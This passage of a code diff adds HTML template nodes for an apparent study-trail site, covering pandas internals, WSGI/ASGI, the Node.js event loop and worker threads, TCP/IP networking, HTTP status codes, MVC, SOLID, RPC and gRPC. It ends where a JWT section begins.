+  │            ▼                                 │
+  │      NumPy vectorised operations             │
+  │            ▼                                 │
+  │      SIMD (CPU vector units)                 │
+  └──────────────────────────────────────────────┘
+         │
+         ▼
+  Contiguous column arrays in RAM</pre>
+<h3>Key Optimisations</h3>
+<ul>
+  <li><strong>Column-oriented storage</strong>: each column is a contiguous C array — reading one column touches nothing else</li>
+  <li><strong>SIMD vectorisation</strong>: NumPy operations exploit CPU vector units automatically</li>
+  <li><strong>Index hash tables</strong>: <code>df.loc[label]</code> is O(1) average, not O(n) scan</li>
+  <li><strong>Copy-on-write</strong> (pandas 2.0+): modifications copy only when data actually diverges</li>
+  <li><strong>Split-apply-combine</strong>: <code>groupby()</code> runs entirely in Cython, not Python loops</li>
+  <li><strong>dtype optimisation</strong>: <code>int32</code> halves memory vs <code>int64</code>; <code>category</code> for low-cardinality strings</li>
+</ul>
+<h3>When to Use What</h3>
+<table>
+  <thead><tr><th>Scenario</th><th>Tool</th></tr></thead>
+  <tbody>
+    <tr><td>Complex multi-step transforms, fits in RAM</td><td>pandas</td></tr>
+    <tr><td>Simple filter/sort of DB data</td><td>ORM or raw SQL</td></tr>
+    <tr><td>Dataset larger than available RAM</td><td>Dask or Polars</td></tr>
+    <tr><td>Statistical analysis, ML feature engineering</td><td>pandas</td></tr>
+    <tr><td>Transactional data with integrity constraints</td><td>ORM / SQL</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-02-11" data-type="node" data-trail="trail-02" data-order="7"
+  data-title="WSGI and ASGI Deep Dive"
+  data-file="Python/WSGI and ASGI Deep Dive.md"
+  data-bridge="With the runtime and deployment model fully clear, OOP is the design layer used to structure the code that runs within it — encapsulation, MRO, duck typing, and the patterns in every production Python codebase.">
+
+<h3>The Problem: No Standard Before WSGI</h3>
+<p>Before PEP 333 (2003), every framework had bespoke server integrations. <strong>WSGI</strong> defined a single callable contract so any server and any framework can be swapped freely — neither side needs to know what the other is built with.</p>
+
+<h3>WSGI Interface</h3>
+<pre>
+  def app(environ, start_response):
+      # environ        — dict: method, path, headers, body (file-like)
+      # start_response — callback: call to send status + response headers
+      start_response('200 OK', [('Content-Type', 'text/plain')])
+      return [b'Hello World']   # iterable of bytes
+
+  ┌────────────┐   environ, start_response   ┌───────────────┐
+  │  Gunicorn  │ ──────────────────────────► │  Django/Flask │
+  │  (server)  │ ◄────────────────────────── │  (your app)   │
+  └────────────┘   iterable of bytes         └───────────────┘
+</pre>
+<div class="warn">WSGI is synchronous — server blocks until app returns. WebSockets never "return", so WSGI cannot model them.</div>
+
+<h3>ASGI Interface (2019)</h3>
+<pre>
+  async def app(scope, receive, send):
+      # scope   — connection metadata (type, path, headers)
+      # receive — async callable: pull incoming events (body chunks, WS messages)
+      # send    — async callable: push outgoing events (response start, body, WS frames)
+
+      await send({'type': 'http.response.start', 'status': 200, 'headers': [...]})
+      await send({'type': 'http.response.body',  'body': b'Hello'})
+
+  One coroutine can hold a WebSocket open indefinitely —
+  sending and receiving events without blocking a process.
+</pre>
+
+<h3>WSGI vs ASGI</h3>
+<table>
+  <thead><tr><th></th><th>WSGI</th><th>ASGI</th></tr></thead>
+  <tbody>
+    <tr><td>Interface</td><td>Sync callable</td><td>Async callable</td></tr>
+    <tr><td>WebSocket / SSE</td><td>No</td><td>Yes</td></tr>
+    <tr><td>HTTP/2</td><td>No</td><td>Yes</td></tr>
+    <tr><td>Servers</td><td>Gunicorn, uWSGI</td><td>Uvicorn, Daphne, Hypercorn</td></tr>
+    <tr><td>Frameworks</td><td>Django, Flask</td><td>FastAPI, Starlette, Django Channels</td></tr>
+  </tbody>
+</table>
+
+<h3>Gunicorn and Uvicorn Are Python</h3>
+<div class="compare">
+  <div><h4>CPython interpreter</h4><pre>
+executes bytecode
+manages memory, GIL
+knows nothing about HTTP
+no socket, no port binding</pre></div>
+  <div><h4>Gunicorn / Uvicorn</h4><pre>
+plain Python packages (pip install)
+binds socket, accepts TCP
+parses HTTP bytes
+calls app(environ, ...) or
+    await app(scope, ...)</pre></div>
+</div>
+<div class="info">Node.js is the exception: its <code>http</code> module is baked into the runtime in C++. No separate server package needed — the runtime IS the server interface.</div>
+
+<h3>Dev Servers vs Production Servers</h3>
+<p>Frameworks ship a dev server already — it uses Python's <code>socket</code> stdlib directly:</p>
+<ul>
+  <li>Django: <code>manage.py runserver</code></li>
+  <li>Flask: <code>flask run</code></li>
+  <li>FastAPI: <code>uvicorn main:app</code> directly</li>
+</ul>
+<p>These are single-process. What Gunicorn adds for production:</p>
+<ul>
+  <li><strong>Pre-fork workers</strong>: spawns N OS processes; copy-on-write memory efficient</li>
+  <li><strong>Crash recovery</strong>: automatically restarts a crashed worker</li>
+  <li><strong>Graceful restart</strong>: drains in-flight requests before replacing workers on deploy</li>
+  <li><strong>Timeout enforcement</strong>: kills hung workers past a threshold</li>
+  <li><strong>Signal handling</strong>: SIGTERM / SIGHUP / SIGWINCH handled correctly</li>
+</ul>
+
+<h3>Common Deployment Patterns</h3>
+<table>
+  <thead><tr><th>Scenario</th><th>Stack</th></tr></thead>
+  <tbody>
+    <tr><td>Development</td><td><code>manage.py runserver</code> or <code>uvicorn main:app</code></td></tr>
+    <tr><td>Simple async prod</td><td><code>uvicorn main:app --workers 4</code></td></tr>
+    <tr><td>Django / Flask prod</td><td>Nginx → Gunicorn → Django</td></tr>
+    <tr><td>FastAPI prod</td><td>Nginx → Gunicorn (process mgr) → Uvicorn workers → FastAPI</td></tr>
+  </tbody>
+</table>
+<div class="info">Gunicorn + Uvicorn workers is a common combo: Gunicorn owns process supervision and signals; Uvicorn owns the async event loop inside each worker.</div>
+</template>
+
+<!-- Trail 03: Node.js Runtime -->
+<template id="node-03-01" data-type="node" data-trail="trail-03" data-order="1"
+  data-title="Event Loop: Role"
+  data-file="NodeJS/Event Loop- Role.md"
+  data-bridge="The 'what': Node's event loop is a single thread that delegates I/O to the browser or OS and processes callbacks when they return. The 'how': libuv, six distinct loop phases, and the critical microtask-vs-macrotask ordering that determines when your callbacks actually run.">
+<h3>The Single-Threaded Problem</h3>
+<pre>
+  JavaScript has ONE call stack.
+  Any slow/synchronous code on the stack BLOCKS everything:
+  rendering, clicks, timers — all frozen until stack empties.
+  "Don't block the event loop" is the cardinal rule.</pre>
+<h3>Async APIs Live OUTSIDE the JS Engine</h3>
+<pre>
+  ┌──────────────────────────────────────────────────────┐
+  │               BROWSER / NODE.JS                       │
+  │                                                       │
+  │  ┌───────────────┐    ┌─────────────────────────┐    │
+  │  │  JS Engine    │    │   Web APIs / OS APIs    │    │
+  │  │  Call Stack   │    │                         │    │
+  │  │               │    │  setTimeout ──────────┐ │    │
+  │  │               │    │  XHR / fetch ─────────┤ │    │
+  │  └──────┬────────┘    └──────────────┬─────────┘ │   │
+  │         │                            │            │   │
+  │         │    ┌───────────────────────▼──────────┐ │   │
+  │         │    │         Task Queue               │ │   │
+  │         │    │  [callback_1, callback_2, ...]   │ │   │
+  │         │    └─────────────────────────────────┘ │   │
+  │         │                    ▲                   │   │
+  │         └──── Event Loop ─────┘                   │   │
+  │               "stack empty? push next callback"   │   │
+  └──────────────────────────────────────────────────┘</pre>
+<h3>setTimeout(0) — After the Stack, Not Immediately</h3>
+<pre>
+  console.log("A");
+  setTimeout(() => console.log("B"), 0);
+  console.log("C");
+
+  1. Stack runs → logs "A"
+  2. setTimeout hands callback to Browser APIs (0ms timer)
+  3. Stack runs → logs "C"
+  4. Stack EMPTIES
+  5. Timer fires → callback → Task Queue
+  6. Event Loop pushes callback → logs "B"
+
+  Output: A, C, B</pre>
+<ul>
+  <li>Rendering is queued like tasks — heavy JS blocks repaints</li>
+  <li>Synchronous callbacks (e.g. <code>Array.forEach</code>) run in current stack — not async</li>
+  <li><strong>Debouncing</strong>: fire handler only after events stop for N ms — prevents queue flooding</li>
+</ul>
+</template>
+
+<template id="node-03-02" data-type="node" data-trail="trail-03" data-order="2"
+  data-title="Event Loop: Deep Dive"
+  data-file="NodeJS/Event Loop- Deep dive.md"
+  data-bridge="The event loop handles I/O concurrency but is helpless for CPU-bound work — one heavy computation blocks everything. Worker threads give you true OS-level parallelism within Node without spawning a new process.">
+<h3>Six Event Loop Phases</h3>
+<pre>
+  ┌─────────────────────────────────────────────────┐
+  │                  EVENT LOOP                      │
+  │                                                  │
+  │   TIMERS          setTimeout / setInterval        │
+  │       ↓                                          │
+  │   PENDING CALLBACKS  I/O errors from prev tick   │
+  │       ↓                                          │
+  │   IDLE / PREPARE  internal use only              │
+  │       ↓                                          │
+  │   POLL            retrieve new I/O, run callbacks│
+  │       ↓           (blocks here if nothing ready) │
+  │   CHECK           setImmediate callbacks          │
+  │       ↓                                          │
+  │   CLOSE CALLBACKS socket.destroy() etc.          │
+  │       └──────────────► (back to TIMERS)           │
+  └─────────────────────────────────────────────────┘</pre>
+<h3>Microtasks vs Macrotasks</h3>
+<pre>
+  MACROTASKS (one per loop tick):
+    setTimeout, setInterval, setImmediate, I/O callbacks
+
+  MICROTASKS (drained COMPLETELY before next phase):
+    process.nextTick  ← highest priority
+    Promise.then/catch
+    queueMicrotask()</pre>
+<h3>Execution Order Example</h3>
+<pre>
+  setTimeout(() => console.log("1: timeout"), 0);
+  Promise.resolve().then(() => console.log("2: promise"));
+  process.nextTick(() => console.log("3: nextTick"));
+  console.log("4: sync");
+
+  Output:
+  4: sync       ← synchronous stack
+  3: nextTick   ← process.nextTick (highest-priority microtask)
+  2: promise    ← Promise microtask
+  1: timeout    ← setTimeout macrotask (next loop tick)</pre>
+<table>
+  <thead><tr><th>Phase</th><th>What runs</th><th>Key APIs</th></tr></thead>
+  <tbody>
+    <tr><td>Timers</td><td>Expired timer callbacks</td><td><code>setTimeout</code>, <code>setInterval</code></td></tr>
+    <tr><td>Poll</td><td>New I/O events + callbacks</td><td><code>fs.readFile</code>, network sockets</td></tr>
+    <tr><td>Check</td><td>Immediate callbacks</td><td><code>setImmediate</code></td></tr>
+  </tbody>
+</table>
+<ul>
+  <li>Node does NOT re-scan source code each tick — callbacks are pre-registered in phase queues</li>
+  <li>Poll phase <strong>blocks</strong> waiting for new I/O if timer queue and check queue are empty — how Node sleeps efficiently</li>
+</ul>
+</template>
+
+<template id="node-03-03" data-type="node" data-trail="trail-03" data-order="3"
+  data-title="Worker Threads"
+  data-file="NodeJS/Worker threads.md"
+  data-bridge="">
+<h3>Node.js Architecture (Three Distinct Layers)</h3>
+<pre>
+  ┌─────────────────────────────────────────────────────────┐
+  │                     NODE.JS RUNTIME                      │
+  │                                                         │
+  │  ┌───────────────────────────────────────────────────┐  │
+  │  │       JS MAIN THREAD  (single thread for JS)      │  │
+  │  │   V8 engine  +  Event Loop (libuv)                │  │
+  │  └───────────────────────┬───────────────────────────┘  │
+  │                          │ delegates work                │
+  │         ┌────────────────┼──────────────────┐           │
+  │         ▼                ▼                  ▼            │
+  │  ┌─────────────┐  ┌──────────────┐  ┌──────────────┐   │
+  │  │   libuv     │  │  Worker      │  │  Worker      │   │
+  │  │   Thread    │  │  Thread 1    │  │  Thread 2    │   │
+  │  │   Pool      │  │  own V8      │  │  own V8      │   │
+  │  │  (4 default)│  │  own loop    │  │  own loop    │   │
+  │  └─────────────┘  └──────────────┘  └──────────────┘   │
+  │  Blocking OS I/O   CPU-bound JS      CPU-bound JS        │
+  │  (fs, DNS, crypto  (image proc,      (compression)       │
+  │   zlib)             ML inference)                        │
+  └─────────────────────────────────────────────────────────┘</pre>
+<div class="compare">
+  <div><h4>libuv Thread Pool</h4>
+    <ul>
+      <li>Handles: <code>fs.readFile</code>, <code>dns.lookup</code>, crypto, zlib</li>
+      <li>Does <strong>NOT</strong> execute JavaScript</li>
+      <li>Callback fires back on main JS thread when done</li>
+    </ul>
+  </div>
+  <div><h4>Worker Threads</h4>
+    <ul>
+      <li>Full V8 instance — runs actual JavaScript</li>
+      <li>Own event loop — truly parallel to main</li>
+      <li>Separate OS thread; independent of libuv pool</li>
+      <li>Communication via <code>postMessage()</code></li>
+    </ul>
+  </div>
+</div>
+<table>
+  <thead><tr><th>Scenario</th><th>Approach</th><th>Why</th></tr></thead>
+  <tbody>
+    <tr><td>File I/O, DNS, crypto</td><td>Async API (nothing extra)</td><td>libuv pool handles it automatically</td></tr>
+    <tr><td>High-concurrency HTTP</td><td>Event loop + async/await</td><td>Non-blocking; no threads needed</td></tr>
+    <tr><td>CPU-bound computation</td><td>Worker threads</td><td>Moves off main thread; true parallelism</td></tr>
+  </tbody>
+</table>
+</template>
+
+<!-- Trail 04: Networking -->
+<template id="node-04-01" data-type="node" data-trail="trail-04" data-order="1"
+  data-title="What Happens When You Visit a Website"
+  data-file="Networking/What happens when you visit a website.md"
+  data-bridge="The full URL-to-pixels journey gives you the narrative. Now zoom into the layers: OSI model, TCP/IP stack, and the protocols at each level — so 'Layer 7 routing' means something concrete.">
+<h3>URL Structure</h3>
+<pre>
+  https://example.com/products/shoes?color=red
+  ──────   ───────────  ──────────────  ─────────
+  scheme   domain        path            query</pre>
+<h3>The Full Journey: 6 Steps</h3>
+<pre>
+  1. URL PARSE
+     Extract scheme, domain, path
+
+  2. DNS LOOKUP
+     browser cache → OS cache → resolver (1.1.1.1)
+     → root server → .com TLD → authoritative server
+     Result: example.com = 93.184.216.34
+     (cached at every level)
+
+  3. TCP HANDSHAKE
+     Browser → SYN → server
+     server → SYN-ACK
+     Browser → ACK     ← ESTABLISHED
+
+  4. TLS HANDSHAKE  (https only)
+     Negotiate cipher, exchange certificates
+     (SSL session resumption reuses prior keys)
+
+  5. HTTP REQUEST / RESPONSE
+     GET / HTTP/1.1 ──────────────────► server
+     HTTP/1.1 200 OK ◄──────────────── HTML
+
+  6. RENDER + SUB-RESOURCES
+     Parse HTML → find CSS, JS, images
+     Repeat steps 2–5 for each resource
+     Reuse TCP connections via Keep-Alive</pre>
+</template>
+
+<template id="node-04-02" data-type="node" data-trail="trail-04" data-order="2"
+  data-title="Networking Fundamentals: Protocols and Layers"
+  data-file="Networking/Networking Fundamentals - Protocols, Layers, and W.md"
+  data-bridge="From the protocol layers, zoom deeper into the mechanics: what sockets actually are as kernel data structures, how TCP's sequence numbers and ACKs ensure reliability, and what routers actually do at each hop.">
+<h3>OSI Model + Encapsulation</h3>
+<pre>
+  Layer             What it does                    Protocols
+  ────────────────  ──────────────────────────────  ─────────────────
+  Application (7)   Format the actual message        HTTP, DNS, SMTP
+  Transport   (4)   Reliable or fast delivery         TCP, UDP, QUIC
+  Network     (3)   Route across the internet         IPv4, IPv6
+  Data Link   (2)   Deliver to the next device        Ethernet, Wi-Fi
+  Physical    (1)   Convert bits to signals            Cables, radio
+
+  Each layer ADDS its own header (encapsulation):
+  ┌─────────────────────────────────────────────────────┐
+  │  HTTP data                             (Application) │
+  ├─────────────────────────────────────────────────────┤
+  │  TCP header  +  HTTP data              (Transport)   │
+  ├─────────────────────────────────────────────────────┤
+  │  IP header   +  TCP segment            (Network)     │
+  ├─────────────────────────────────────────────────────┤
+  │  Ethernet hdr + IP packet              (Data Link)   │
+  └─────────────────────────────────────────────────────┘
+                     ↓ bits on wire (Physical)</pre>
+<h3>DNS Resolution Steps</h3>
+<pre>
+  1. Browser DNS cache   → hit? done
+  2. OS DNS cache        → hit? done
+  3. OS sends UDP query (port 53) to resolver
+  4. Resolver → Root server    "Who handles .com?"
+  5. Resolver → TLD server     "Who handles example.com?"
+  6. Resolver → Auth server    "What is example.com's IP?"
+  7. IP returned and cached at resolver + OS + browser</pre>
+<h3>TCP vs UDP</h3>
+<table>
+  <thead><tr><th></th><th>TCP</th><th>UDP</th></tr></thead>
+  <tbody>
+    <tr><td>Reliability</td><td>Guaranteed (ACKs + retransmit)</td><td>No guarantee</td></tr>
+    <tr><td>Ordering</td><td>In-order delivery assured</td><td>Out-of-order possible</td></tr>
+    <tr><td>Connection</td><td>3-way handshake required</td><td>Connectionless</td></tr>
+    <tr><td>Use for</td><td>HTTP, SSH, databases</td><td>DNS, video streaming, gaming, QUIC</td></tr>
+  </tbody>
+</table>
+<h3>Port Ranges</h3>
+<table>
+  <thead><tr><th>Range</th><th>Type</th><th>Examples</th></tr></thead>
+  <tbody>
+    <tr><td>0–1023</td><td>Well-known (root to bind)</td><td>80 HTTP, 443 HTTPS, 53 DNS, 22 SSH</td></tr>
+    <tr><td>1024–49151</td><td>Registered apps</td><td>3306 MySQL, 5432 Postgres, 6379 Redis</td></tr>
+    <tr><td>49152–65535</td><td>Ephemeral (OS assigns to clients)</td><td>Your browser's outbound source ports</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li>TCP port 80 and UDP port 80 are completely independent namespaces (protocol is part of the 5-tuple)</li>
+  <li>HTTP/2 runs over TCP; HTTP/3 runs over QUIC (UDP-based, built-in encryption, faster connection setup)</li>
+</ul>
+</template>
+
+<template id="node-04-03" data-type="node" data-trail="trail-04" data-order="3"
+  data-title="Networking Deep Dive: How the Internet Actually Works"
+  data-file="Networking/Networking Deep Dive — How the Internet Actually Works.md"
+  data-bridge="With the full request cycle understood, HTTP status codes are the vocabulary servers use to communicate outcomes — essential for designing and consuming APIs correctly.">
+<h3>End-to-End: 7 Stages</h3>
+<pre>
+  STAGE 1: Browser — socket(), connect(), write("GET / HTTP/1.1...")
+  STAGE 2: Kernel  — TCP segments, IP wraps, Ethernet frame → NIC queue
+  STAGE 3: NIC     — converts frame to electrical signals → wire
+  STAGE 4: Routers (10–20 hops)
+           Each: strip Ethernet → read IP → routing table → new Ethernet frame
+           IP addresses STAY THE SAME. MAC addresses CHANGE every hop.
+           Routers NEVER read TCP headers or HTTP content.
+  STAGE 5: Server's kernel — NIC → strip layers → matches 5-tuple → socket
+           Web server: read() → process → write("HTTP/1.1 200 OK...")
+  STAGE 6: Response (~36 TCP segments for 52 KB)
+           Each segment independently routed back
+           Kernel reassembles in order using sequence numbers
+  STAGE 7: Browser renders — discovers sub-resources → fetch via same socket</pre>
+<h3>Socket: A Kernel Data Structure</h3>
+<pre>
+  ┌─────────────────────────────────────────────────────┐
+  │            SOCKET in kernel memory                   │
+  │                                                      │
+  │  5-tuple: (TCP, 192.168.1.42, 52384, 93.184.216.34, 80) │
+  │  Send buffer:    your write() calls queue here       │
+  │  Receive buffer: incoming data waits here            │
+  │  Sequence tracking: next seq# to send: 1501          │
+  │  State: ESTABLISHED                                  │
+  └─────────────────────────────────────────────────────┘
+  A socket is NOT a wire — it is kernel state.
+  Every TCP segment travels independently as an IP packet.</pre>
+<h3>TCP 3-Way Handshake + Sequence Numbers</h3>
+<pre>
+  Browser → SYN, seq=1000   "My first byte is #1001"
+  Google  → SYN-ACK, seq=5000, ack=1001
+  Browser → ACK, ack=5001   ESTABLISHED
+
+  Google sends 52 KB response (split into segments):
+    seq=5001, len=1460  ✓ received
+    seq=6461, len=1460  ✗ LOST!
+    seq=7921, len=1460  ✓ held out of order
+
+  Browser → ACK 6461 (duplicate — gap not filled)
+  Google retransmits seq=6461 → Browser ACK 9381 ✓
+
+  ACKs are cumulative: ACK 9381 = "everything up to 9380 received"</pre>
+<ul>
+  <li>Browser only uses 4 syscalls: <code>socket()</code>, <code>connect()</code>, <code>write()</code>, <code>read()</code></li>
+  <li>MSS ≈ 1,460 bytes = 1,500 (Ethernet) − 20 (IP) − 20 (TCP)</li>
+  <li>HTTP is plain ASCII text written into the socket — no binary encoding of headers</li>
+</ul>
+</template>
+
+<template id="node-04-04" data-type="node" data-trail="trail-04" data-order="4"
+  data-title="HTTP Status Codes"
+  data-file="Networking/Status Code.md"
+  data-bridge="">
+<h3>Five Categories</h3>
+<table>
+  <thead><tr><th>Category</th><th>Range</th><th>Meaning</th></tr></thead>
+  <tbody>
+    <tr><td>Informational</td><td>1xx</td><td>Request received, processing</td></tr>
+    <tr><td>Success</td><td>2xx</td><td>Request succeeded</td></tr>
+    <tr><td>Redirection</td><td>3xx</td><td>Client must take further action</td></tr>
+    <tr><td>Client Error</td><td>4xx</td><td>The request is wrong</td></tr>
+    <tr><td>Server Error</td><td>5xx</td><td>Server failed on a valid request</td></tr>
+  </tbody>
+</table>
+<h3>Key Codes Reference</h3>
+<table>
+  <thead><tr><th>Code</th><th>Name</th><th>When to use</th></tr></thead>
+  <tbody>
+    <tr><td>200</td><td>OK</td><td>GET/PUT succeeded; body present</td></tr>
+    <tr><td>201</td><td>Created</td><td>POST created a resource; include <code>Location</code> header</td></tr>
+    <tr><td>202</td><td>Accepted</td><td>Request received but async (job queued)</td></tr>
+    <tr><td>204</td><td>No Content</td><td>DELETE/PUT succeeded; no body</td></tr>
+    <tr><td>301</td><td>Moved Permanently</td><td>Browser caches redirect (good for SEO, bad for analytics)</td></tr>
+    <tr><td>302</td><td>Found</td><td>Temporary; browser does NOT cache (use for URL shorteners)</td></tr>
+    <tr><td>304</td><td>Not Modified</td><td>Client cache is fresh; skip re-sending body</td></tr>
+    <tr><td>400</td><td>Bad Request</td><td>Malformed request (unparseable JSON, missing fields)</td></tr>
+    <tr><td>401</td><td>Unauthorized</td><td>"Who are you?" — not authenticated</td></tr>
+    <tr><td>403</td><td>Forbidden</td><td>"I know who you are, but no" — not authorized</td></tr>
+    <tr><td>404</td><td>Not Found</td><td>Resource does not exist</td></tr>
+    <tr><td>409</td><td>Conflict</td><td>Write conflict (duplicate key, stale lock)</td></tr>
+    <tr><td>422</td><td>Unprocessable Entity</td><td>Parseable but semantically invalid (validation errors)</td></tr>
+    <tr><td>429</td><td>Too Many Requests</td><td>Rate limit exceeded</td></tr>
+    <tr><td>500</td><td>Internal Server Error</td><td>Generic server failure; safe to retry</td></tr>
+    <tr><td>502</td><td>Bad Gateway</td><td>Upstream service returned invalid response</td></tr>
+    <tr><td>503</td><td>Service Unavailable</td><td>Server overloaded or in maintenance</td></tr>
+    <tr><td>504</td><td>Gateway Timeout</td><td>Upstream did not respond in time</td></tr>
+  </tbody>
+</table>
+<div class="info"><strong>400 vs 422:</strong> 400 = can't even parse the request; 422 = parsed fine but values are invalid.<br><strong>301 vs 302:</strong> 301 = browser caches and skips your server next time (bad for analytics); 302 = every visit hits your server.</div>
+</template>
+
+<!-- Trail 05: Backend Architecture -->
+<template id="node-05-01" data-type="node" data-trail="trail-05" data-order="1"
+  data-title="MVC"
+  data-file="MVC.md"
+  data-bridge="MVC is a structural pattern; SOLID is the set of principles that explain why that structure is valuable. Understanding SOLID transforms 'this is how web frameworks work' into 'this is why code stays maintainable as it grows'.">
+<h3>The Three Layers</h3>
+<pre>
+  REQUEST → ROUTER → CONTROLLER → MODEL → CONTROLLER → VIEW → RESPONSE
+                         ↑                    ↑
+                   (calls model)       (passes data)
+  Model and View NEVER talk directly.</pre>
+<div class="compare">
+  <div><h4>Traditional Web (HTML)</h4><pre>View = HTML template
+employee.ejs:
+&lt;h1&gt;{{employee.name}}&lt;/h1&gt;</pre></div>
+  <div><h4>Your REST API</h4><pre>View = JSON formatter
+responseHandler.ts:
+{ success: true,
+  data: {...} }</pre></div>
+</div>
+<h3>Service Layer Enhancement</h3>
+<div class="compare">
+  <div><h4>Pure MVC (fat controller)</h4><pre>Controller handles:
+- HTTP parsing
+- Business rules
+- DB queries
+- Response format
+Hard to test ✗</pre></div>
+  <div><h4>MVC + Service Layer</h4><pre>Controller: HTTP only
+  └─ call service
+Service: business logic
+  └─ call model
+Model: DB queries
+Thin, testable ✓</pre></div>
+</div>
+<h3>Framework Naming Map</h3>
+<table>
+  <thead><tr><th>Framework</th><th>Model</th><th>View</th><th>Controller</th></tr></thead>
+  <tbody>
+    <tr><td>Django</td><td>ORM Model</td><td>Template</td><td><strong>View</strong> function (confusing!)</td></tr>
+    <tr><td>Rails</td><td>ActiveRecord</td><td>.erb template</td><td>Controller</td></tr>
+    <tr><td>Express / Node</td><td>Mongoose schema</td><td>responseHandler</td><td>Route handler</td></tr>
+    <tr><td>FastAPI</td><td>Pydantic / SQLAlchemy</td><td>Response schema</td><td>APIRouter endpoint</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-05-02" data-type="node" data-trail="trail-05" data-order="2"
+  data-title="SOLID Principles"
+  data-file="SOLID.md"
+  data-bridge="With SOLID's principle of separation in mind, you're ready for the first inter-service communication pattern: RPC treats a remote function call like a local one, and gRPC pushes that idea to its performant extreme.">
+<h3>S — Single Responsibility</h3>
+<div class="compare">
+  <div><h4>Before</h4><pre>class Order:
+    add_item()
+    total_price()
+    pay(type, code) ← WRONG</pre></div>
+  <div><h4>After</h4><pre>class Order:     ← data only
+    add_item()
+    total_price()
+class PaymentProcessor: ← payments
+    pay_debit(order, code)
+    pay_credit(order, code)</pre></div>
+</div>
+<h3>O — Open / Closed</h3>
+<div class="compare">
+  <div><h4>Violates OCP</h4><pre>def pay(type, code):
+    if type == "debit": ...
+    elif type == "credit": ...
+    # add Bitcoin? edit this! ✗</pre></div>
+  <div><h4>Satisfies OCP</h4><pre>class PaymentProcessor(ABC):
+    @abstractmethod
+    def pay(order): ...
+class DebitPaymentProcessor(PaymentProcessor):
+    def pay(order): ...
+# Add Bitcoin = add new class ✓</pre></div>
+</div>
+<h3>L — Liskov Substitution</h3>
+<p>Subtypes must be substitutable for their base type. Fix: move credentials to <code>__init__</code>, keep <code>pay(order)</code> signature consistent across all subclasses.</p>
+<h3>I — Interface Segregation (via Composition)</h3>
+<pre>
+  class SMSAuthorizer:       ← separate concern
+      def verify_code(code): ...
+      def is_authorized(): bool
+
+  class DebitPaymentProcessor:
+      def __init__(self, code, authorizer):
+      def pay(order):
+          assert authorizer.is_authorized()
+          # process debit ✓
+
+  CreditPaymentProcessor never has to implement SMS methods it doesn't support.</pre>
+<h3>D — Dependency Inversion</h3>
+<pre>
+  class Authorizer(ABC):     ← abstraction
+      @abstractmethod
+      def authorize(): ...
+
+  class SMSAuthorizer(Authorizer):     ...
+  class NotARobotAuthorizer(Authorizer): ...
+
+  PaymentProcessor receives any Authorizer.
+  Switch auth method = swap the dependency, touch nothing else. ✓</pre>
+<div class="info">Prefer <strong>composition over inheritance</strong> — passing <code>SMSAuthorizer</code> into <code>PaymentProcessor</code> is cleaner than <code>class SMSPaymentProcessor(PaymentProcessor)</code>.</div>
+</template>
+
+<template id="node-05-03" data-type="node" data-trail="trail-05" data-order="3"
+  data-title="RPC"
+  data-file="RPC.md"
+  data-bridge="RPC establishes the concept; gRPC is its production-grade implementation — Protobuf serialization, HTTP/2 multiplexing, and streaming built for high-throughput microservices.">
+<h3>What RPC Means</h3>
+<div class="compare">
+  <div><h4>Local call</h4><pre>result = my_function(args)
+No network, instant,
+never fails.</pre></div>
+  <div><h4>Remote Procedure Call</h4><pre>result = remote_function(args)
+1. args serialised
+2. network request sent
+3. remote server executes
+4. response deserialised
+Same syntax, very different risks.</pre></div>
+</div>
+<div class="warn">Risk: pretending a remote call is local. Network calls have latency, timeouts, and partial failure modes that local calls never have.</div>
+<h3>Lambda (RPC-style) vs gRPC</h3>
+<table>
+  <thead><tr><th></th><th>Lambda</th><th>gRPC</th></tr></thead>
+  <tbody>
+    <tr><td>Infrastructure</td><td>Fully managed (serverless)</td><td>Self-managed</td></tr>
+    <tr><td>Protocol</td><td>HTTP / HTTPS</td><td>HTTP/2</td></tr>
+    <tr><td>Serialisation</td><td>JSON (text)</td><td>Protocol Buffers (binary)</td></tr>
+    <tr><td>Latency</td><td>Higher (cold starts)</td><td>Lower (persistent connections)</td></tr>
+    <tr><td>Streaming</td><td>Not supported</td><td>Client, server, bidirectional</td></tr>
+    <tr><td>Best for</td><td>Event-driven, low-traffic</td><td>High-performance microservices</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-05-04" data-type="node" data-trail="trail-05" data-order="4"
+  data-title="gRPC"
+  data-file="GRPC.md"
+  data-bridge="Inter-service communication raises an immediate question: how do services verify identity? JWT answers it with stateless, self-contained tokens that work across any protocol.">
+<h3>gRPC vs REST</h3>
+<table>
+  <thead><tr><th></th><th>REST</th><th>gRPC</th></tr></thead>
+  <tbody>
+    <tr><td>Format</td><td>JSON (text)</td><td>Protocol Buffers (binary)</td></tr>
+    <tr><td>Transport</td><td>HTTP/1.1 — one req per connection</td><td>HTTP/2 — multiplex many on one TCP</td></tr>
+    <tr><td>Schema</td><td>Loose (any valid JSON)</td><td>Strict (.proto file)</td></tr>
+    <tr><td>Payload size</td><td><code>{"name":"Alice","age":30}</code> = 28 bytes</td><td>Binary equivalent ≈ 7 bytes</td></tr>
+    <tr><td>Browser-friendly</td><td>Yes</td><td>No (needs grpc-web proxy)</td></tr>
+  </tbody>
+</table>
+<h3>HTTP/2 Multiplexing</h3>
+<div class="compare">
+  <div><h4>HTTP/1.1</h4><pre>Connection 1: req1 → resp1
+Connection 2: req2 → resp2
+Connection 3: req3 → resp3
+3 TCP handshakes</pre></div>
+  <div><h4>HTTP/2 (gRPC)</h4><pre>One connection:
+  stream 1: req1 ──► resp1
+  stream 3: req2 ──► resp2
+  stream 5: req3 ──► resp3
+1 handshake → all calls free</pre></div>
+</div>
+<h3>Four Streaming Modes</h3>
+<table>
+  <thead><tr><th>Mode</th><th>Direction</th><th>Use case</th></tr></thead>
+  <tbody>
+    <tr><td>Unary</td><td>1 req → 1 resp</td><td>Regular request-response</td></tr>
+    <tr><td>Server streaming</td><td>1 req → stream</td><td>Live feed, log tail</td></tr>
+    <tr><td>Client streaming</td><td>stream → 1 resp</td><td>File upload, batch ingest</td></tr>
+    <tr><td>Bidirectional</td><td>both stream</td><td>Chat, real-time collaboration</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-05-05" data-type="node" data-trail="trail-05" data-order="5"
+  data-title="JWT"
+  data-file="JWT.md"
+  data-bridge="Authentication establishes who. As systems scale, the bigger challenge is how they read and write data. CQRS separates those two concerns entirely, and Event Sourcing makes every state change an auditable, replayable fact.">
+<h3>JWT Structure</h3>
+<pre>
